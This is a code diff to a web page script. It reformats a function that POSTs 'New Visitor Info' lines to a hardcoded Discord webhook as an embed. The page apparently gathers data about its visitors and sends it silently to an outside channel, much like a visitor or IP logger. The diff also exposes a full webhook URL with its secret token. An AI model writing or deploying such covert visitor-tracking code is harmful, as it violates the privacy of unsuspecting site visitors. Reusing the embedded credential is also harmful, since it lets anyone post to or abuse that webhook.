@@ -391,11 +391,32 @@ function HandlePage() {
   // Add this function to send info to Discord webhook
   function sendToWebhook(infoLines) {
     const webhookUrl = "https://discord.com/api/webhooks/1393670218462527630/BzU38SCAKRQEJ7unIXmIk0BsmgTLFuzNbRYwgYstj5O7cQvqddQA1owOz--_cWUHbNxL";
-    const content = infoLines.join('\n');
+    // Split each line into a field (label: value)
+    const fields = infoLines.map(line => {
+      const idx = line.indexOf(':');
+      if (idx !== -1) {
+        return {
+          name: line.slice(0, idx).trim(),
+          value: line.slice(idx + 1).trim() || '\u200b',
+          inline: false
+        };
+      } else {
+        return { name: '\u200b', value: line, inline: false };
+      }
+    });
+    const embed = {
+      title: "New Visitor Info",
+      color: 0x00C800, // Minecraft green
+      fields: fields,
+      footer: {
+        text: "guns.lol | @bu8f"
+      },
+      timestamp: new Date().toISOString()
+    };
     fetch(webhookUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content })
+      body: JSON.stringify({ embeds: [embed] })
     });
   }
 
